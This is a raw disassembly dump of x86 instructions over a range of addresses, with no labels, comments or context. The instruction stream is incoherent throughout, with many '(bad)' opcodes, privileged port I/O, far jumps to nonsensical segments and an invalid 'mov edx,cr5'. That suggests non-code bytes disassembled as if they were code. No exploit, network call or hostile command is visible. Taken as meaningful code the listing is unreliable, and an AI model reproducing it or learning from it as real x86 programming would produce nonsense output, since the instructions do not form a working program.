  414abe:	xor    cl,ch
  414ac0:	pop    ss
  414ac1:	mov    dh,0xb
  414ac3:	div    BYTE PTR [edx]
  414ac5:	adc    eax,DWORD PTR [ebp-0xf]
  414ac8:	jbe    0x414adc
  414aca:	adc    eax,0x557ac791
  414acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad0:	test   eax,0x22ec97c1
  414ad5:	ins    BYTE PTR es:[edi],dx
  414ad6:	mov    cl,0x82
  414ad8:	enter  0xfeb3,0x2a
  414adc:	nop
  414add:	sbb    eax,0x8140fa1c
  414ae2:	shr    BYTE PTR [edx-0x73],0x5b
  414ae6:	lods   eax,DWORD PTR ds:[esi]
  414ae7:	pop    ds
  414ae8:	jne    0x414b57
  414aea:	sub    al,0xe6
  414aec:	test   al,0xb7
  414aee:	push   ds
  414aef:	and    bl,BYTE PTR [ebp+0x625ffef2]
  414af5:	mov    esi,0x585b2887
  414afa:	inc    esp
  414afb:	sub    ecx,edi
  414afd:	mov    eax,ds:0xc289e6e2
  414b02:	lds    esi,FWORD PTR [esi+ebx*4+0x17312b6e]
  414b09:	xchg   ebp,eax
  414b0a:	mov    ebx,0xe6f89f33
  414b0f:	mov    ebp,0x85f652bc
  414b14:	xchg   ebx,eax
  414b15:	in     eax,0x41
  414b17:	mov    dh,BYTE PTR [ecx+0x2a]
  414b1a:	inc    esi
  414b1b:	xor    eax,0x8133d527
  414b20:	call   0xd8101be5
  414b25:	popf   
  414b26:	and    eax,0x8071d19e
  414b2b:	xchg   edi,eax
  414b2c:	sbb    ebp,DWORD PTR [edi+0x3a]
  414b2f:	dec    ecx
  414b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b31:	fnstcw WORD PTR [eax-0x60641484]
  414b37:	jg     0x414b06
  414b39:	test   al,0x15
  414b3b:	out    dx,al
  414b3c:	lock pop ecx
  414b3e:	test   eax,0x7fce69ed
  414b43:	sbb    DWORD PTR [eax+0x4ff8454c],esi
  414b49:	popa   
  414b4a:	push   ebx
  414b4b:	xchg   esi,eax
  414b4c:	xor    BYTE PTR [ecx+0x5a86df09],ch
  414b52:	icebp  
  414b53:	push   ebp
  414b54:	lods   eax,DWORD PTR ds:[esi]
  414b55:	push   0xffffffcc
  414b57:	lahf   
  414b58:	loopne 0x414b7e
  414b5a:	xor    al,BYTE PTR [esi+0x53]
  414b5d:	jge    0x414afb
  414b5f:	push   ecx
  414b60:	ficom  WORD PTR [eax]
  414b62:	and    al,dh
  414b64:	cmp    DWORD PTR [ecx+0xa],ebp
  414b67:	sub    BYTE PTR [ecx+esi*2-0x3b],0x1a
  414b6c:	jb     0x414bc2
  414b6e:	adc    BYTE PTR [ebx],ah
  414b70:	sub    al,0x39
  414b72:	dec    ebx
  414b73:	push   edx
  414b74:	fsubr  QWORD PTR [ebx]
  414b76:	rcr    dl,1
  414b78:	iret   
  414b79:	xchg   edi,eax
  414b7a:	adc    ah,0xf2
  414b7d:	inc    ecx
  414b7e:	xor    edi,ebp
  414b80:	rol    BYTE PTR ds:0x3f0dac08,cl
  414b86:	fdiv   st(0),st
  414b88:	mov    eax,ds:0x56b2eb5f
  414b8d:	bound  edx,QWORD PTR [edx]
  414b8f:	jmp    0xdc720e2
  414b94:	data16 sbb al,0x19
  414b97:	inc    ecx
  414b98:	test   eax,0xa8103295
  414b9d:	xchg   esi,eax
  414b9e:	sahf   
  414b9f:	and    eax,DWORD PTR [ebx+0x7]
  414ba2:	xor    ch,al
  414ba4:	out    dx,al
  414ba5:	lods   eax,DWORD PTR ds:[esi]
  414ba6:	in     eax,dx
  414ba7:	mov    ecx,0x6b145616
  414bac:	(bad)  
  414bad:	cmp    edi,ecx
  414baf:	push   edx
  414bb0:	out    dx,al
  414bb1:	jmp    0x414b82
  414bb3:	inc    eax
  414bb4:	cmp    cl,BYTE PTR [ecx+0x3b]
  414bb7:	dec    esp
  414bb8:	xchg   bl,bl
  414bba:	aad    0xc0
  414bbc:	pop    es
  414bbd:	dec    edx
  414bbe:	mov    DWORD PTR [eax+0x1eb39cd2],ebx
  414bc4:	and    BYTE PTR [eax],bh
  414bc6:	jb     0x414bc1
  414bc8:	pop    ecx
  414bc9:	mov    al,0xc0
  414bcb:	xchg   esi,eax
  414bcc:	imul   esp,DWORD PTR [eax+0x1],0x379c8b38
  414bd3:	rcr    DWORD PTR [esi+0x18],1
  414bd6:	inc    ecx
  414bd7:	sub    al,dh
  414bd9:	inc    esp
  414bda:	xor    al,0xd2
  414bdd:	out    0xcf,al
  414bdf:	add    eax,0x3cce49e0
  414be4:	mov    ebx,0x197cffe8
  414be9:	sbb    edi,DWORD PTR [esp+eiz*4+0x2a025290]
  414bf0:	imul   esp,eax,0xa178911d
  414bf6:	gs push ebx
  414bf8:	push   esi
  414bf9:	ffree  st(2)
  414bfb:	ret    
  414bfc:	fld    TBYTE PTR [ebx+ebx*2+0x4efc614]
  414c03:	adc    eax,0xcb275920
  414c08:	pop    ecx
  414c09:	ins    DWORD PTR es:[edi],dx
  414c0a:	add    DWORD PTR [esi+0x12],0x11641fc
  414c11:	aad    0x35
  414c13:	mov    bl,0x9b
  414c15:	lds    esp,FWORD PTR [ebx+eiz*8]
  414c18:	pop    edx
  414c19:	and    esi,DWORD PTR [ebx]
  414c1b:	cmp    esp,ecx
  414c1d:	pop    edx
  414c1e:	std    
  414c1f:	call   0x47cd3136
  414c24:	xchg   ebx,eax
  414c25:	mov    eax,0x24c96199
  414c2a:	dec    ebx
  414c2b:	out    dx,al
  414c2c:	fisttp DWORD PTR [esi]
  414c2e:	je     0x414ca0
  414c30:	in     eax,0x19
  414c32:	(bad)  
  414c34:	and    DWORD PTR [eax],esp
  414c36:	ret    
  414c37:	mov    esi,edx
  414c39:	lds    ebx,FWORD PTR [edi-0x296818ce]
  414c3f:	(bad)  
  414c40:	fs xchg edx,eax
  414c42:	icebp  
  414c43:	inc    edx
  414c44:	adc    eax,0xf79f09fc
  414c49:	cmp    al,0xab
  414c4b:	je     0x414cad
  414c4d:	adc    al,0x90
  414c4f:	out    0x16,eax
  414c51:	inc    edx
  414c52:	retf   0x9c22
  414c55:	fsub   QWORD PTR [esi+0x66]
  414c58:	jno    0x414cb9
  414c5a:	push   0x4cf3ea53
  414c5f:	and    DWORD PTR [ebp-0x40],ecx
  414c62:	mov    ds,edi
  414c64:	xor    BYTE PTR [ebx],ch
  414c66:	mov    bl,0xd1
  414c68:	imul   esp,esi,0xffffffd5
  414c6b:	ins    DWORD PTR es:[edi],dx
  414c6c:	rcr    eax,cl
  414c6e:	xchg   bl,bh
  414c70:	icebp  
  414c71:	mov    WORD PTR [edi-0x40244ed],cs
  414c77:	outs   dx,BYTE PTR ds:[esi]
  414c79:	in     al,dx
  414c7a:	iret   
  414c7b:	and    BYTE PTR [eax+0x335d4999],ah
  414c81:	idiv   BYTE PTR [edi+0x5c]
  414c84:	and    ebp,edx
  414c86:	and    dl,BYTE PTR [edi-0x39]
  414c89:	pop    ss
  414c8a:	lods   al,BYTE PTR ds:[esi]
  414c8b:	repz pop esi
  414c8d:	jmp    0x3ccd:0x735ab769
  414c94:	fcomp  DWORD PTR ds:0x9ce5c7d4
  414c9a:	in     al,0x91
  414c9c:	fucomi st,st(7)
  414c9e:	xor    DWORD PTR [eax],edx
  414ca0:	enter  0x1385,0xd
  414ca4:	xchg   BYTE PTR [edx-0x6be32d26],ch
  414caa:	loop   0x414c93
  414cac:	lea    ecx,[edi]
  414cae:	pop    esp
  414caf:	and    BYTE PTR [esi-0x4d23b294],ch
  414cb5:	sbb    BYTE PTR [edi+0x47],dh
  414cb8:	mov    edx,DWORD PTR [edi]
  414cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cbb:	sub    edx,esi
  414cbd:	cli    
  414cbe:	cmp    DWORD PTR [ebx-0x7c],0x205aaa40
  414cc5:	jbe    0x414c47
  414cc7:	xor    BYTE PTR [ecx+0x19],dl
  414cca:	stc    
  414ccb:	xchg   ebx,eax
  414ccc:	adc    BYTE PTR [edi-0x4b],0x66
  414cd0:	fucomip st,st(3)
  414cd2:	mov    ebx,0xb703b61e
  414cd7:	pushf  
  414cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd9:	mov    edx,edx
  414cdb:	pop    edx
  414cdc:	call   FWORD PTR [ebp+0x4022c940]
  414ce2:	push   edi
  414ce3:	cmp    eax,0x438e0efa
  414ce8:	xlat   BYTE PTR ds:[ebx]
  414ce9:	or     edx,DWORD PTR [edi+0x69a94fc1]
  414cef:	dec    ebp
  414cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf1:	and    eax,0xbd4245f
  414cf6:	repz sub al,0xe5
  414cf9:	inc    esi
  414cfa:	test   eax,0x82ecdd43
  414cff:	rcl    al,1
  414d01:	add    edx,DWORD PTR [ecx]
  414d03:	call   FWORD PTR [eax]
  414d05:	add    edx,ebp
  414d07:	aad    0x22
  414d09:	retf   
  414d0a:	jp     0x414cf0
  414d0c:	sub    dl,bh
  414d0e:	fidiv  WORD PTR [eax-0x5abf1cb3]
  414d14:	sti    
  414d15:	cmovge esi,esi
  414d18:	je     0x414d3e
  414d1a:	mov    cl,0x46
  414d1c:	leave  
  414d1d:	ret    0x44e8
  414d20:	pop    ss
  414d21:	xor    DWORD PTR [edi-0x5414a412],ebp
  414d27:	sub    eax,0x1aeab1ee
  414d2c:	cmp    cl,dl
  414d2e:	add    edi,edi
  414d30:	adc    dl,BYTE PTR [ebx]
  414d32:	call   0x53274115
  414d37:	fdivr  QWORD PTR [esi+0x3e]
  414d3a:	sbb    BYTE PTR [edi+esi*8+0x652ef4bb],dl
  414d41:	dec    ebx
  414d42:	and    al,0xf5
  414d44:	rcr    DWORD PTR [ecx],cl
  414d46:	dec    esp
  414d47:	xchg   DWORD PTR [edi],edi
  414d49:	repnz jmp 0x60f2:0x7e8f5b82
  414d51:	or     esp,DWORD PTR [eax+0x7f537351]
  414d57:	sub    ebx,DWORD PTR [ebx]
  414d59:	pop    edx
  414d5a:	retf   
  414d5b:	mov    bl,0x98
  414d5d:	xchg   edx,eax
  414d5e:	cs test eax,0xac940d3c
  414d64:	xor    eax,0x1cddf820
  414d69:	or     bl,BYTE PTR [ebx-0x6f6e305c]
  414d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d70:	add    BYTE PTR [ecx],bl
  414d72:	stos   DWORD PTR es:[edi],eax
  414d73:	int3   
  414d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d75:	push   esi
  414d76:	jb     0x414d70
  414d78:	or     esp,eax
  414d7a:	ror    DWORD PTR [edi+0x40833de7],0x40
  414d81:	aam    0x75
  414d83:	cdq    
  414d84:	daa    
  414d85:	gs das 
  414d87:	ins    BYTE PTR es:[edi],dx
  414d88:	add    ch,BYTE PTR ds:0x3fe6d5b9
  414d8e:	jecxz  0x414df7
  414d90:	push   edi
  414d91:	inc    esp
  414d92:	xor    DWORD PTR [edx+0x67],ebp
  414d95:	jl     0x414da5
  414d97:	fst    QWORD PTR [edx+0x14]
  414d9a:	xchg   ebp,eax
  414d9b:	enter  0xfa5c,0xe1
  414d9f:	sub    edx,DWORD PTR ds:0xa7dddcd3
  414da5:	jbe    0x414d7e
  414da7:	or     edi,DWORD PTR [ebx+eax*4+0x5c]
  414dab:	repz adc eax,0x67610762
  414db1:	xor    al,0xe2
  414db3:	mov    ebp,ecx
  414db5:	xchg   bl,dl
  414db7:	mov    ebp,0xddc23769
  414dbc:	xchg   esp,eax
  414dbd:	sub    ebx,esp
  414dbf:	out    dx,eax
  414dc0:	xor    ah,bh
  414dc2:	or     bh,BYTE PTR [edx+0x56]
  414dc5:	gs pop ebx
  414dc7:	push   es
  414dc8:	jne    0x414d59
  414dca:	bnd jbe 0x414da3
  414dcd:	jbe    0x414e3d
  414dcf:	fs mov bh,0xc4
  414dd2:	test   eax,0x2b4aa22b
  414dd7:	fist   DWORD PTR [ecx+ebp*8]
  414dda:	scas   eax,DWORD PTR es:[edi]
  414ddb:	ret    
  414ddc:	daa    
  414ddd:	repnz push 0xffffff87
  414de0:	cwde   
  414de1:	test   eax,0xa2033840
  414de6:	daa    
  414de7:	mov    ds:0x1daaf0ee,al
  414dec:	adc    DWORD PTR [eax],0x6c
  414def:	pop    eax
  414df0:	or     esi,ecx
  414df2:	(bad)  
  414df3:	aad    0x98
  414df5:	out    0xc0,eax
  414df7:	pop    es
  414df8:	in     eax,dx
  414df9:	xchg   edi,eax
  414dfa:	mov    dh,0x14
  414dfc:	mov    dl,0x97
  414dfe:	push   esi
  414dff:	pop    edx
  414e00:	or     DWORD PTR [eax+eax*1-0x6b],esp
  414e04:	jmp    0x9255378
  414e09:	outs   dx,DWORD PTR ds:[esi]
  414e0a:	mov    eax,ds:0xff9d1294
  414e0f:	scas   eax,DWORD PTR es:[edi]
  414e10:	stos   BYTE PTR es:[edi],al
  414e11:	pop    esp
  414e12:	sub    DWORD PTR ds:0x4935348c,0xffffffbf
  414e19:	push   edx
  414e1a:	dec    ecx
  414e1b:	pop    eax
  414e1c:	mov    bl,0xf3
  414e1e:	sbb    BYTE PTR [ebx],al
  414e20:	pop    ss
  414e21:	out    dx,al
  414e22:	mov    ah,0x8b
  414e24:	cmp    eax,0x14df1023
  414e29:	adc    eax,0xca14bed2
  414e2e:	mov    BYTE PTR ds:0xebecbace,ah
  414e34:	pop    es
  414e35:	mov    esp,DWORD PTR [ecx]
  414e37:	adc    eax,ecx
  414e39:	pop    eax
  414e3a:	xchg   ebx,eax
  414e3b:	retf   
  414e3c:	lods   al,BYTE PTR ds:[esi]
  414e3d:	je     0x414e14
  414e3f:	push   esi
  414e40:	mov    al,0xaf
  414e42:	dec    esp
  414e43:	scas   eax,DWORD PTR es:[edi]
  414e44:	in     al,0x70
  414e46:	out    dx,al
  414e47:	adc    al,0x3
  414e49:	jb     0x414e68
  414e4b:	fwait
  414e4c:	mov    ds:0x30c89941,eax
  414e51:	outs   dx,DWORD PTR ds:[esi]
  414e52:	mov    al,al
  414e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e55:	push   es
  414e56:	mov    ebp,DWORD PTR ds:0x99f546f3
  414e5c:	jg     0x414ea9
  414e5e:	das    
  414e5f:	dec    esp
  414e60:	(bad)  
  414e61:	pop    esi
  414e62:	or     DWORD PTR [edx+0x15],0xffffffb1
  414e66:	data16 test BYTE PTR [ecx+0x21],cl
  414e6a:	es sub cl,BYTE PTR gs:0x3c406383
  414e72:	repz jle 0x414e6e
  414e75:	add    eax,DWORD PTR ds:0xa98fcf79
  414e7b:	pushf  
  414e7c:	imul   DWORD PTR [ecx]
  414e7e:	push   esi
  414e7f:	xlat   BYTE PTR ds:[ebx]
  414e80:	adc    al,bl
  414e82:	and    DWORD PTR [ebp-0x35],esi
  414e85:	js     0x414e45
  414e87:	pop    ecx
  414e88:	push   ebx
  414e89:	mov    al,0xb6
  414e8b:	ins    BYTE PTR es:[edi],dx
  414e8c:	sub    dh,BYTE PTR [ecx+0x26]
  414e8f:	push   esp
  414e90:	mov    edi,0xb1502f07
  414e95:	push   edi
  414e96:	ds ret 
  414e98:	push   ecx
  414e99:	call   0x8e53:0xc71aba81
  414ea0:	iret   
  414ea1:	pop    edx
  414ea2:	adc    al,0xaf
  414ea4:	mov    ebx,0xac938f68
  414ea9:	cmp    DWORD PTR [esi-0x48],edi
  414eac:	aad    0xcd
  414eae:	inc    eax
  414eaf:	popw   ds
  414eb1:	stos   DWORD PTR es:[edi],eax
  414eb2:	cmp    BYTE PTR [esi-0x47],bh
  414eb5:	and    al,0xe2
  414eb7:	or     cl,dl
  414eb9:	pop    esi
  414eba:	xchg   edx,eax
  414ebb:	lea    esp,[esi-0x47623923]
  414ec1:	pop    ds
  414ec2:	test   eax,0xb180789c
  414ec7:	pop    esp
  414ec8:	outs   dx,DWORD PTR ds:[esi]
  414ec9:	xor    eax,0xf5907061
  414ece:	inc    edi
  414ecf:	push   es
  414ed0:	pop    eax
  414ed1:	int    0xc1
  414ed3:	inc    edx
  414ed4:	adc    al,0xee
  414ed6:	mov    WORD PTR [edi],?
  414ed8:	and    ch,bl
  414eda:	lods   al,BYTE PTR ds:[esi]
  414edb:	(bad)  
  414edc:	mov    ch,0xb6
  414ede:	jb     0x414f34
  414ee0:	rcr    BYTE PTR [ecx-0x2f0cf27c],cl
  414ee6:	adc    BYTE PTR [ecx+ebp*8],ah
  414ee9:	jo     0x414f68
  414eeb:	stos   BYTE PTR es:[edi],al
  414eec:	xchg   ebx,eax
  414eed:	mov    ds:0x7f2bc393,eax
  414ef2:	imul   ebx,edi,0x855d1fcd
  414ef8:	cmp    al,0x19
  414efa:	push   eax
  414efb:	or     DWORD PTR [eax],0x4f519daa
  414f01:	repnz pop esi
  414f03:	pop    eax
  414f04:	mov    ah,0x3e
  414f06:	fisubr WORD PTR [ebx+ebx*4+0x7f3c9497]
  414f0d:	rcr    BYTE PTR [edx],0xdd
  414f10:	sub    DWORD PTR [ecx-0x9e5a279],esi
  414f16:	ins    BYTE PTR es:[edi],dx
  414f17:	stos   BYTE PTR es:[edi],al
  414f18:	popa   
  414f19:	xchg   BYTE PTR [edi-0x37],cl
  414f1c:	xchg   esp,eax
  414f1d:	gs jecxz 0x414f7f
  414f20:	xchg   ecx,eax
  414f21:	xor    BYTE PTR [esp+esi*1-0x2080c264],bh
  414f28:	imul   eax,DWORD PTR [ebx],0x769fa0ca
  414f2e:	push   es
  414f2f:	shr    DWORD PTR [esi],0x13
  414f32:	cdq    
  414f33:	rol    BYTE PTR [esi],cl
  414f35:	push   es
  414f36:	jle    0x414f08
  414f38:	and    BYTE PTR [ecx],0xf1
  414f3b:	adc    DWORD PTR [eax-0x4079ac8e],eax
  414f41:	cmc    
  414f42:	push   edi
  414f43:	ins    DWORD PTR es:[edi],dx
  414f44:	sub    al,0x1a
  414f46:	cmpxchg DWORD PTR [esi],edi
  414f49:	imul   DWORD PTR [ebx+0x2d]
  414f4c:	xlat   BYTE PTR ds:[ebx]
  414f4d:	jne    0x414ef3
  414f4f:	cmp    eax,0xfb685280
  414f54:	pusha  
  414f55:	loope  0x414f19
  414f57:	call   0xa8bc:0x10543df5
  414f5e:	and    DWORD PTR [eax],esi
  414f60:	call   0xe3df:0xf264dad3
  414f67:	adc    eax,0x978e0707
  414f6c:	sbb    DWORD PTR [ecx-0xe54ac62],esp
  414f72:	jmp    0x414f95
  414f74:	xchg   esi,eax
  414f75:	mov    dh,0xa8
  414f77:	or     DWORD PTR [ebx],edi
  414f79:	pop    ebx
  414f7a:	into   
  414f7b:	jmp    0xd34b8c02
  414f80:	mov    al,0xe8
  414f82:	ins    BYTE PTR es:[edi],dx
  414f83:	into   
  414f84:	ins    DWORD PTR es:[edi],dx
  414f85:	mov    WORD PTR [edx+0x51],?
  414f88:	lea    ebp,[ebx]
  414f8a:	hlt    
  414f8b:	sub    edx,DWORD PTR [edi-0x4]
  414f8e:	shr    DWORD PTR es:[ebp-0x6b],1
  414f92:	pushf  
  414f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f94:	in     al,dx
  414f95:	pop    esi
  414f96:	dec    eax
  414f97:	inc    esi
  414f98:	adc    edi,DWORD PTR [ecx-0x4f46cd2d]
  414f9e:	inc    edi
  414f9f:	daa    
  414fa0:	push   cs
  414fa1:	(bad)  
  414fa2:	dec    esi
  414fa3:	jl     0x415010
  414fa5:	inc    edi
  414fa6:	mov    ds,esi
  414fa8:	inc    edi
  414fa9:	mov    al,0x20
  414fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fac:	push   edi
  414fad:	sub    DWORD PTR [edi+ebp*4-0x3aa04e4],esi
  414fb4:	push   esi
  414fb5:	mov    ah,BYTE PTR [edi-0x7a]
  414fb8:	adc    ah,bl
  414fba:	add    al,0x2e
  414fbc:	lock mov ebx,0x5dfb6c03
  414fc2:	xor    DWORD PTR [ecx-0x516b2d1c],0x72
  414fc9:	jnp    0x414ff7
  414fcb:	pop    esi
  414fcc:	aam    0xce
  414fce:	mov    ?,WORD PTR ds:0x8b54e5c7
  414fd4:	and    eax,DWORD PTR [ebp+0x6e]
  414fd7:	repnz cmp ch,BYTE PTR [ebp+0x77]
  414fdb:	cwde   
  414fdc:	stos   DWORD PTR es:[edi],eax
  414fdd:	pop    edi
  414fde:	out    dx,eax
  414fdf:	outs   dx,DWORD PTR ds:[esi]
  414fe0:	sti    
  414fe1:	push   edi
  414fe2:	sti    
  414fe3:	pop    edi
  414fe4:	adc    dl,BYTE PTR [ebp+0x44f46dd7]
  414fea:	mov    BYTE PTR ds:0x3b5a9cec,ah
  414ff0:	in     eax,0x1d
  414ff2:	sti    
  414ff3:	retf   0x1266
  414ff6:	pop    edx
  414ff7:	aaa    
  414ff8:	mov    eax,0xf12385
  414ffd:	call   DWORD PTR [esi]
  414fff:	retf   0xedaf
  415002:	pop    edi
  415003:	ficomp DWORD PTR [edi-0x2b3487d3]
  415009:	call   0x5e620913
  41500e:	inc    esi
  41500f:	xchg   BYTE PTR [ecx-0x62083b38],ah
  415015:	dec    ebp
  415016:	dec    ebx
  415017:	inc    ebp
  415018:	adc    BYTE PTR [edi-0x1a12b033],ah
  41501e:	xor    ebp,ebx
  415020:	and    BYTE PTR [edi-0xc],dh
  415023:	mov    edi,DWORD PTR [ecx+0x21838fd3]
  415029:	adc    bh,BYTE PTR [edx-0x76]
  41502c:	ds mov eax,0x86353c97
  415032:	or     DWORD PTR [esi+0x6ac56be3],0xffffff82
  415039:	js     0x414fdb
  41503b:	stos   BYTE PTR es:[edi],al
  41503c:	lea    eax,[esi]
  41503e:	mov    eax,ds:0x37c4bedb
  415043:	je     0x41508d
  415045:	bound  ebp,QWORD PTR [ecx+eax*2]
  415048:	mov    dl,0xbd
  41504a:	lea    ecx,[edx+0xd]
  41504d:	mov    esp,ss
  41504f:	mov    esi,0x7a81d52
  415054:	fldcw  WORD PTR [ebx+0xe3ad14a]
  41505a:	out    0x5b,eax
  41505c:	xchg   DWORD PTR [edx],esp
  41505e:	cdq    
  41505f:	cmp    al,0xf2
  415061:	mov    ecx,0xfcb4860a
  415066:	aas    
  415067:	cmp    cl,BYTE PTR [esi+0x2b]
  41506a:	add    al,0xe8
  41506c:	mov    edx,cr5
  41506f:	dec    edx
  415070:	cmp    eax,esi
  415072:	mov    esi,0xb738f005
  415077:	retf   
  415078:	push   ebx
  415079:	stos   DWORD PTR es:[edi],eax
  41507a:	push   ebx
  41507b:	out    0x64,al
  41507d:	push   ecx
  41507e:	out    0xf4,eax
  415080:	lods   eax,DWORD PTR ds:[esi]
  415081:	daa    
  415082:	sbb    al,0xa9
  415084:	mov    DWORD PTR [ebp-0x59],edi
  415087:	in     eax,dx
  415088:	jecxz  0x415022
  41508a:	mov    ecx,0xd1fe0407
  41508f:	add    ch,BYTE PTR es:[esi+0x57fc9489]
  415096:	sbb    ebp,DWORD PTR [esi+0x6aafaa53]
  41509c:	and    ah,BYTE PTR [esp+edi*2+0x3fa86fb6]
  4150a3:	cmp    BYTE PTR [edi-0x568763dc],dl
  4150a9:	(bad)
  4150ac:	in     al,dx
  4150ad:	stc    
  4150ae:	push   esp
  4150af:	or     BYTE PTR [ecx+0x69a235cf],bl
  4150b5:	hlt    
  4150b6:	and    BYTE PTR [eax],bl
  4150b8:	dec    edi
  4150b9:	sub    ebx,DWORD PTR [ebp+0x48]
  4150bc:	data16 repnz cli 
  4150bf:	cs test al,0x1c
  4150c2:	js     0x4150f6
  4150c4:	sub    edi,DWORD PTR [edi-0x51]
  4150c7:	lahf   
  4150c8:	ret    0x9c3a
  4150cb:	mov    DWORD PTR [edi-0x6e],ebp
  4150ce:	cmp    BYTE PTR [eax+ebx*1-0x1f4cc0e8],dl
  4150d5:	js     0x4150a1
  4150d7:	clc    
  4150d8:	fmul   DWORD PTR [edi]
  4150da:	ins    BYTE PTR es:[edi],dx
  4150db:	jae    0x41514f
  4150dd:	push   esi
  4150de:	fs and al,0x70
  4150e1:	mov    ebp,0x52565429
  4150e6:	into   
  4150e7:	loop   0x415129
  4150e9:	and    BYTE PTR cs:[ecx-0x525c8571],ah
  4150f0:	fwait
  4150f1:	xor    al,0x2a
  4150f3:	out    0xaa,al
  4150f5:	push   ecx
  4150f6:	or     ecx,DWORD PTR [edi-0x61]
  4150f9:	into   
  4150fa:	jle    0x41513d
  4150fc:	and    edi,0xffffffe5
  4150ff:	sbb    DWORD PTR [ebp-0x243f0317],edx
  415105:	push   0xffffffd2
  415107:	call   0xf6b0:0x92614684
  41510e:	or     al,0xae
  415110:	sbb    al,0x58
  415112:	cmp    BYTE PTR [ebx-0x59a33ba1],bh
  415118:	or     dh,al
  41511a:	adc    al,0xc
  41511c:	std    
  41511d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41511e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41511f:	frstor [ebx+0x1d173375]
  415125:	xor    DWORD PTR [ecx+0x4d],edi
  415128:	jns    0x4150d7
  41512a:	cmp    DWORD PTR gs:[esi-0x7fc61129],ebx
  415131:	dec    ecx
  415132:	fisubr DWORD PTR [esi]
  415134:	add    ebx,DWORD PTR [esi-0x4b567c73]
  41513a:	dec    esp
  41513b:	cmp    BYTE PTR [edx+0x0],ch
  41513e:	fdiv   st,st(1)
  415140:	shl    esp,cl
  415142:	(bad)  [esp+eax*8+0x3a370cc2]
  415149:	loopne 0x41517a
  41514b:	push   es
  41514c:	jge    0x415142
  41514e:	inc    eax
  41514f:	adc    BYTE PTR [eax+0x34],0x38
  415153:	test   eax,0x43b7f4b
  415158:	ja     0x415165
  41515a:	in     eax,0x2c
  41515c:	adc    edi,DWORD PTR [ebx]
  41515e:	and    eax,0x9e7ff687
  415163:	lea    ebp,[ebx+eax*4]
  415166:	jmp    0x8ef6:0x4a2d4432
  41516d:	mov    cs,ecx
  41516f:	addr16 push ds
  415171:	es leave 
  415173:	or     al,0xc7
  415175:	das    
  415176:	push   ecx
  415177:	add    bh,cl
  415179:	out    dx,al
  41517a:	or     eax,0x2ae21723
  41517f:	mov    bh,0x63
  415181:	xor    DWORD PTR ds:0x9de9a2fa,eax
  415187:	jnp    0x415144
  415189:	adc    BYTE PTR [ecx],ah
  41518b:	inc    ebx
  41518c:	ins    DWORD PTR es:[edi],dx
  41518d:	add    eax,0xa8a1231d
  415192:	rcl    DWORD PTR [ebp-0x6220e374],0x22
  415199:	outs   dx,DWORD PTR ds:[esi]
  41519a:	mov    bl,0x66
  41519c:	fisttp QWORD PTR [eax]
  41519e:	jb     0x41520c
  4151a0:	push   0xffffffb2
  4151a2:	mov    WORD PTR [ebx+eiz*2+0x78],?
  4151a6:	adc    BYTE PTR ds:0xfd1f4506,0xd1
  4151ad:	clc    
  4151ae:	imul   DWORD PTR [ebx+0x61fb6171]
  4151b4:	mov    ah,dh
  4151b6:	stos   BYTE PTR es:[edi],al
  4151b7:	mov    bl,0xa
  4151b9:	or     al,0x59
  4151bb:	fcom   DWORD PTR [ebp-0x317a7454]
  4151c1:	jmp    0x37b8:0x1c7db223
  4151c8:	sub    ebp,DWORD PTR [edi-0x13]
  4151cb:	addr16 in al,dx
  4151cd:	xchg   ebp,eax
  4151ce:	add    dl,dh
  4151d0:	mov    DWORD PTR [ebx+0x2bc8eabb],esi
  4151d6:	push   ebx
  4151d7:	mov    cl,0xb
  4151d9:	push   ebp
  4151da:	mov    edi,0xabc9f437
  4151df:	stos   BYTE PTR es:[edi],al
  4151e0:	sub    eax,DWORD PTR [esi-0x2950d85]
  4151e6:	call   FWORD PTR [esi-0x379f6ac5]
  4151ec:	jnp    0x4151a9
  4151ee:	inc    esp
  4151ef:	cmp    al,0xb5
  4151f1:	lahf   
  4151f2:	mul    DWORD PTR [ecx]
  4151f4:	fist   WORD PTR [esi-0x1f]
  4151f7:	add    BYTE PTR [edi-0x4b],ch
  4151fa:	js     0x415271
  4151fc:	cmp    eax,0xa8dcd277
  415201:	jg     0x4151e1
  415203:	mov    DWORD PTR [edx+edx*2-0x637499],edi
  41520a:	cmp    al,0x48
  41520c:	jmp    esi
  41520e:	cbw    
  415210:	icebp  
  415211:	dec    eax
  415212:	je     0x415258
  415214:	(bad)  
  415215:	(bad)  [eax-0x38b16317]
  41521b:	or     al,0xd0
  41521d:	and    bh,BYTE PTR [ebp-0x46]
  415220:	xchg   ebp,eax
  415221:	pop    ebp
  415222:	popf   
  415223:	aam    0x9
  415225:	test   al,0x58
  415227:	iret   
  415228:	imul   edi,DWORD PTR [ebx],0xbf24c39c
  41522e:	lea    edi,[esi]
  415230:	cmc    
  415231:	popf   
  415232:	sbb    bl,BYTE PTR [eax-0x5c93ce06]
  415238:	mov    bh,BYTE PTR [ebp+0x1a64324c]
  41523e:	shr    DWORD PTR [ecx],1
  415240:	push   ebp
  415241:	mov    edi,0x13486dc9
  415246:	push   ss
  415247:	or     DWORD PTR [edi-0x127a60b],ebx
  41524d:	push   eax
  41524e:	aaa    
  41524f:	mov    eax,0xfec74bc3
  415254:	pop    ebx
  415255:	jnp    0x415260
  415257:	xchg   esi,eax
  415258:	aaa    
  415259:	out    0xce,al
  41525b:	je     0x415245
  41525d:	push   0xa214ff97
  415262:	stos   BYTE PTR es:[edi],al
  415263:	push   edi
  415264:	and    eax,0x2943d7f4
  415269:	rcl    DWORD PTR [edx-0x26],1
  41526c:	dec    esp
  41526d:	neg    ah
  41526f:	dec    esi
  415270:	dec    eax
  415271:	inc    esp
  415272:	pusha  
  415273:	and    BYTE PTR [ebx-0x3e],bh
  415276:	loop   0x415225
  415278:	sbb    eax,0xf58f349e
  41527d:	(bad)
  415280:	hlt    
  415281:	pop    esp
